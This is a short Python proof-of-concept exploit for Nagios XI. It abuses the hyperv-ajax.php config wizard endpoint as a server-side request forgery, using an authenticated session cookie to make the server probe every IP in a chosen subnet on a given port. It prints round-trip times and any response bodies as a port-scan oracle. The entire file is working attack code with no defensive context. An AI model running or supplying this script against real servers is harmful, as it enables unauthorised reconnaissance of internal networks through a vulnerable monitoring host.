#!/usr/bin/python3
import requests
import argparse
import sys
import time
import ipaddress

parser = argparse.ArgumentParser(
    sys.argv[0],
    description="Port scan a host for the top 1000 ports ",
)
parser.add_argument("--target", help="The targets to be scanned as a mask (192.168.1.0/24)")
parser.add_argument("--cookie", help="Session cookie for the nagios user")
parser.add_argument("--nagios", help="URL of the nagios host")
parser.add_argument("--port", help="The port to scan", default=443)

args = parser.parse_args()

if not args.cookie:
  print("Gimme cookies! (authenticated session required, use --cookie session_cookie)")
  exit(1)

if not args.nagios:
  print("Specify the url of the nagios server with --nagios host_url")
  exit(1)

if not args.target:
  print("Specify a subnet mask with --target [subnet_mask], for example --target 192.168.1.0/24")
  exit(1)

host = ""
if (args.nagios.endswith("/")):
    host = args.nagios
else:
    host = args.nagios + "/"

print(f"Scanning port {args.port} on {args.target}")
print("IP:Request Time")
for ip in ipaddress.IPv4Network(args.target):
  start = time.time()
  r = requests.get(f"{args.nagios}/nagiosxi/includes/configwizards/hyperv/hyperv-ajax.php", params={ 'ip_address': f"{ip}:{args.port}/?" }, headers={ 'cookie': f"nagiosxi={args.cookie}"})
  end = time.time()
  roundtrip = "{:.3f}".format(end - start)
  print(f"{ip}:{roundtrip}")
  if (len(r.text) > 0):
    print(r.text)
  sys.stdout.flush()
